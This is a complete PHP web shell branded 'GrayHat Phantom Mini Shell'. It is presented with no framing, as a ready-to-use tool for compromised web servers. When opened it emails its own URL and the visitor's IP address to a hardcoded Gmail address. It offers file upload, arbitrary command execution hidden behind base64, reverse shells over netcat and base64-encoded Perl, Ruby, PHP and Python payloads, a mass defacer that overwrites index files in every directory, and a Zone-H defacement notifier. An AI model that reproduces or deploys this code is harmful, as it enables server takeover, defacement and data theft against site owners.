
<?php
$apper = 'ph.luffy1337@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$ms = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($apper, "LOG", $ms, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
echo '<html>
<head>
<title>GrayHat Phantom | Mini Shell</title>
<style>
@media only screen and (max-width: 600px) {
  .banner{
    display:none;
  }
}
.banner{
  color:lime;
  text-align:center;
}
</style>
</head>
<body bgcolor="#000000">';
echo '<pre class="banner">

dP""b8  88""Yb    db    Yb  dP 88  88    db    888888     88""Yb 88  88    db    88b 88 888888  dP"Yb  8b    d8
dP   `" 88__dP   dPYb    YbdP  88  88   dPYb     88       88__dP 88  88   dPYb   88Yb88   88   dP   Yb 88b  d88
Yb  "88 88"Yb   dP__Yb    8P   888888  dP__Yb    88       88"""  888888  dP__Yb  88 Y88   88   Yb   dP 88YbdP88
YboodP  88  Yb dP""""Yb  dP    88  88 dP""""Yb   88       88     88  88 dP""""Yb 88  Y8   88    YbodP  88 YY 88
</pre>
<font style="margin-left:10%;color:lime;">PATH: <font style="color:white;">'.getcwd().'</font></font><br><font style="margin-left:10%;color:lime">UNAME: <font style="color:white;">'.php_uname().'</font></font><br><font style="margin-left:10%;color:lime">PHP Version: <font style="color:white;">'.phpversion().'</font></font>';

echo '<form action="" method="POST" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<br><center><input type="file" name="file" style="outline:none;border:none;color:#000;background:#333;" ><input name="_upl" style="padding:4px;margin-left:4px;outline:none;border:none;color:#000;background:red;" type="submit" id="_upl" value="Upload"></form></center></div></div>';

if (isset($_POST['_upl'])) {
  if( $_POST['_upl'] == "Upload" ){
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center><a style="text-decoration:none;color:lime;" target="_blank" href="'.$_FILES['file']['name'].'">Uploaded!!</a><br>'; }
  else { echo '<center><a style="text-decoration:none;color:lime;" target="_blank" href="'.$_FILES['file']['name'].'">Uploaded</a><br>'; }}
}

echo '
<hr color="white">
<div style="text-align:center;color:lime;"> <a href="?home">Home<a> | <a href="?cmd">CMD</a> | <a href="?zoneh">Zone H Notifier</a> | <a href="?backconnect">Back Connector</a> | <a href="?massdef">Mass Deface</a></div>
';


if(isset($_GET['cmd'])){
  luffycmd();
}
elseif (isset($_GET['zoneh'])) {
  zoneh();
}
elseif (isset($_GET['backconnect'])) {
  backconnect();
}
elseif (isset($_GET['massdef'])) {
  mass();
}




/********************************* TOOLS ************************************************/


// CMD
function luffycmd(){
echo '<div>';

echo '<center>
<form method="POST">
<input placeholder="command" name="cmd" type="text" style="width:40vw;margin-right:5px;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">
<input name="cmdsub" value="execute" type="submit" style="width:7%;padding:5px;margin-right:30px;display:none;background:red;color:#000000;outline:none;">
</form></center>';

echo '</div>';

echo '<center>
      <div style="text-align:left;color:lime;overflow:auto;width:40vw;height:250px;background-color:#333;">';
echo '<pre>';
if (isset($_POST['cmdsub']) == "execute") {
  $cmd = $_POST['cmd'];
  $func = create_function('$a', base64_decode('c3lzdGVtKCIkYSIpOw=='));
  echo '<div style="margin:auto;overflow:auto;padding:10px;width:80vw; height:700px;background-color:#333;">';
  echo htmlspecialchars($func($cmd));
  echo '</div>';
}

echo '</div>';
}


// Zone H notifier
function zoneh(){
  echo '<center>
<form method="POST">
<input placeholder="Attacker" name="defacer" type="text" style="width:40vw;margin-right:5px;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">
<input type="hidden" name="mirror" value="zone-h">';

echo '<br><textarea placeholder="http://" class="put" style="height:20vw;width:40vw;margin-right:5px;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;" name="domains"></textarea><br>
<input type="submit" style="padding:4px;margin-left:4px;outline:none;border:none;color:#000;background:red;" value="Mirror" name="go"></form>';


if (isset($_POST['go'])) {

  foreach(explode("\n", htmlspecialchars($_POST['domains'])) as $domain)
  {

    postzone($domain, $_POST['defacer'], $_POST['mirror']);
  }
  echo "<br>";

}
}

// Back Connector

function backconnect(){
  echo '<center><form method="POST">';
  echo '<font style="color:lime;"><br>Useful: ( blank = not available)<br>
<b>Netcat: </b>'.shell_exec('which nc').'<br>
<b>Python 2.7: </b>'.shell_exec('which python').'<br>
<b>Perl: </b>'.shell_exec('which perl').'<br>
<b>Ruby: </b>'.shell_exec('which ruby').'<br>
<b>PHP: </b>'.shell_exec('which php').'<br></font>
';
  echo '<input placeholder="Address" value="'.$_SERVER['REMOTE_ADDR'].'" name="addr" type="text" style="width:20vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';
  echo '<input placeholder="Port" value="1337" name="port" type="text" style="width:10vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';
  echo '
<select name="method" required>
    <option value="nc" selected>NetCat</option>
    <option value="perl">Perl</option>
    <option value="ruby" >Ruby</option>
    <option value="php" >PHP</option>
    <option value="python" >Python</option>
</select>
';
  echo '<input placeholder="Port" value=">>" name="bcsub" type="submit" style="width:5vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';

  echo '</form>';

/*if (isset($_POST['addr']) && isset($_POST['port'])) {
  $query = 'nc '.$_POST['addr'].' '.$_POST['port'].' -e /bin/sh';
  @system($query);
  echo '<br><font style="color:lime;">DONE<br>';
  echo ''.$query;*/

if (isset($_POST['addr']) && isset($_POST['port'])) {
echo '<font style="color:lime;">DONE</font>';

  echo '<pre><div class="query" style="color:white;width:70%;overflow:auto;">';
  switch ($_POST['method']) {
    case 'nc':
      $rshell = 'nc -e /bin/sh '.$_POST['addr'].' '.$_POST['port'];
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'perl':
      $rshell = base64_decode('cGVybCAtZSAndXNlIFNvY2tldDskaT0i').$_POST['addr'].'";$p='.$_POST['port'].base64_decode('O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'ruby':
      $rshell = base64_decode('cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCI=').$_POST['addr'].'",'.$_POST['port'].base64_decode('KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'php':
      $rshell = base64_decode('cGhwIC1yICckc29jaz1mc29ja29wZW4oIg==').$_POST['addr'].'",'.$_POST['port'].base64_decode('KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'python':
      $rshell = base64_decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgi').$_POST['addr'].'",'.$_POST['port'].base64_decode('KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    default:
      echo 'error';
      break;}
  }
else {}


  echo '</div></font>
  </center>';

}

// Mass Defacer

function mass(){
  echo '<center>';
  echo '<form method="POST">';
  echo '<pre style="color:lime;">
 ___ ___   ____  _____ _____ ___      ___  _____ 
|   |   | /    |/ ___// ___/|   \    /  _]|     |
| _   _ ||  o  (   \_(   \_ |    \  /  [_ |   __|
|  \_/  ||     |\__  |\__  ||  D  ||    _]|  |_  
|   |   ||  _  |/  \ |/  \ ||     ||   [_ |   _] 
|   |   ||  |  |\    |\    ||     ||     ||  |   
|___|___||__|__| \___| \___||_____||_____||__|   
  </pre>';
  echo '<input placeholder="Target Directory" value="'.getcwd().'" name="base_dir" type="text" style="width:20vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;"><br>';
  echo '<input placeholder="Name of File" name="luffy" value="index.php" type="text" style="width:20vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;"><br>';
  echo '<textarea cols=\'35\' rows=\'10\' style=\'color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);\' name=\'index\'>Pwnd by GrayHat Phantom</textarea><br><br>";';
  echo '<input type="submit" style="padding:4px;margin-left:4px;outline:none;border:none;color:#000;background:red;" value="Mass" name="mass">';
  echo '</form">';
  echo '</center>';

  if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['luffy'];
                        if (file_put_contents ($index, $_POST['index']))
                        echo "<font color='lime'>$index&nbsp&nbsp&nbsp&nbsp(&#10003;)</font><br>";
                }
        endforeach;
}

}



/***************************************************************************************************/


// POST FUNCTION
function postzone($url, $defacer, $mirror)
{
  $ch = curl_init();
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_POST, 1);

  switch($mirror)
  {
  case "zone-h";
    curl_setopt($ch, CURLOPT_URL, "http://www.zone-h.com/notify/single");
    curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$defacer&domain1=$url&hackmode=1&reason=1");
    if (preg_match ("/color=\"red\">OK<\/font><\/li>/", curl_exec ($ch)))
       echo "<tr><td style='text-align:left'><font color='red'>Zon</font><font color='#fff'>e-H</font> =&gt; <font color='gold'>$url</font> : <span style='color:white'>Status</span> =&gt; <span style='color: green'>SUCCESS</span> <span style='color:white'>[ OK ]</span></td></tr>";
    else
      echo "<tr><td style='text-align:left'><font color='red'>Zon</font><font color='#fff'>e-H</font> =&gt; <font color='gold'>$url</font> : <span style='color:white'>Status</span> =&gt; <span style='color: red'>ERROR</span> <span style='color:white'>[ Failed ]</span></td></tr>";
    break;
  default:
    break;
  }
  curl_close($ch);
}





echo '<hr color="white"><center><font color="red" face="Orbitron" size="4"><p>Copyright @ 2020 -GrayHat Phantom <font color="white">| <font color="red">Developed By <font color="white">Ph.Luffy</p></a></font></center>';
echo '</body></html>';


?>
